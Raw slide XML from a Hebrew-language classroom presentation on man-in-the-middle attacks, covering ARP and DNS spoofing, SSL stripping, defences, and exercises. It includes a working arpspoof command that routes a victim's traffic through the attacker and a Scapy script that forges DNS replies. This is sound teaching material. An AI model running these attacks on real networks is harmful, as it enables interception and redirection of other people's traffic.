              <a:t> לתוקף?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="71105698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3B2E72-17A1-430E-B852-F4B055DB2F51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3011556" y="642594"/>
            <a:ext cx="8113643" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת אמצע – תשובות חלק ב'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{257DB12C-329B-40F9-8502-8DF17E930C0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ARP Spoofing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתבצע ברשת מקומית ומשנה את הקישור בין כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לכתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בעוד ש-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS Spoofing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתבצע ברמה גלובלית ומשנה את הקישור בין שם מתחם לכתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SSL Stripping </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מסיר את ההצפנה של חיבור</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> והופך אותו לחיבור</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לא מאובטח, מה שמאפשר לתוקף ליירט ולשנות את התעבורה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מאובטח, אימות התשובות המתקבלות משרתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, ושימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>VPN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להצפין את התעבורה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wi-Fi Pineapple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מאפשר לתוקף להתחבר למשתמשים ברשתות אלחוטיות וליירט את התעבורה שלהם בצורה קלה יחסית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19502344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184C04E-2721-40B9-9FA5-CE63AA468BDE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4919870" y="642594"/>
            <a:ext cx="6205329" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת אמצע – שאלת קוד</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7186B8A2-2DF6-43CD-87B2-AFA7BCF27EAC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתוב סקריפט ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Bash </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמבצע התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ARP Spoofing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>באמצעות כלי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>arpspoof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> , הסקריפט צריך להפנות את כל התעבורה מהמחשב של הקורבן דרך המחשב של התוקף לנתב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הנתב</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GATEWAY_IP="192.168.1.1"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של הקורבן</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>VICTIM_IP="192.168.1.100“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ממשק הרשת</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>INTERFACE="eth0"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפעלת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>arpspoof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לזייף את ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ARP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בין הקורבן לנתב</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>arpspoof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> $INTERFACE -t $VICTIM_IP $GATEWAY_IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נסביר על הקוד בשקופית הבאה..</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42707828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5D48FC9-EB60-4970-873C-E885BEE08C1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2226364" y="642594"/>
            <a:ext cx="8898835" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפת אמצע – שאלת קוד</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE526EC8-B4FA-4DC4-A69A-8099A04F91AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GATEWAY_IP="192.168.1.1"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>VICTIM_IP="192.168.1.100"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>INTERFACE="eth0"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>arpspoof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> $INTERFACE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>-t $VICTIM_IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>$GATEWAY_IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GATEWAY_IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הנתב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>VICTIM_IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הקורבן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>INTERFACE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ממשק הרשת בו תתבצע ההתקפה כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eth0</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הרצת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>arpspoof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפקודה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>arpspoof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עם האפשרויות הבאות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> $INTERFACE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : מציין את ממשק הרשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-t $VICTIM_IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מציין את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של הקורבן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$GATEWAY_IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מציין את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הנתב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="220375155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689AA1B-EF84-44E3-85A9-9CFCAA0E676A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7841974" y="125759"/>
            <a:ext cx="3283226" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלה לש"ב</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63BBB81F-039E-48D3-BB7F-46C23DAD07CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1192696"/>
            <a:ext cx="10058400" cy="5198165"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עליכם לחקור את הקוד הבא:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>scapy.all</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> import *</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>spoof_dns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(packet):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    if DNS in packet and packet[DNS].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>qd.qname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> == </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>b'example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.':</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        response = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>packet.copy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        response[IP].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dst</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = packet[IP].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        response[IP].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = packet[IP].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dst</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        response[UDP].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = packet[UDP].sport</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        response[DNS].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>qr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        response[DNS].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ancount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        response[DNS].an = DNSRR(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rrname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>b'example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.', </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rdata</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>='123.123.123.123')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        send(response)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>sniff(filter='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>udp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> port 53', prn=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>spoof_dns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20116386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C2B0899-8774-443A-8A60-2941C0A91542}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5864086" y="642594"/>
            <a:ext cx="5261113" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלה לש"ב - המשך</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{498C8C2A-FFC0-4504-A948-3288FC1DD379}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1.  עליכם להסביר מה הפונקציה מקבלת לפרמטר, ומדוע דווקא פרמטר זה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. הסבר בבקשה את השורה הבאה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>if DNS in packet and packet[DNS].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>qd.qname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> == </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>b'example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.':</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהי שורת האזנה בקוד?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="296144985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FBFF650-8530-4CD1-9F09-72A085398524}"/>
